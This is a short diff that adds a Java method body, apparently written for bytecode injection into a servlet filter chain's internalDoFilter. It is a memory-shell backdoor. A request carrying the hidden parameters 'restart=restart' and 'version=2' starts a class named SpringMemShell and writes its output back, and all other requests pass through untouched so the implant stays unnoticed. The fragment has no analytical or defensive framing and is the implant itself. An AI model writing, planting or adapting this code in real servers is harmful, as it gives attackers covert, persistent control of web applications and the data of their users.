@@ -1,0 +1,21 @@
+{
+    final javax.servlet.ServletRequest req = $1;
+    final javax.servlet.ServletResponse res = $2;
+    String password = "";
+    String result = "";
+    try{
+        password = req.getParameter("restart");
+        if (password.equals("restart")) {
+            String version = req.getParameter("version");
+            if (version.equals("2")) {
+                result += com.stdout.springMem.SpringMemShell.start();
+                res.getWriter().write(result);
+                return;
+            }
+        }
+    } catch (Exception e) {
+        password = "";
+    }
+
+    $0.internalDoFilter(req,res);
+}
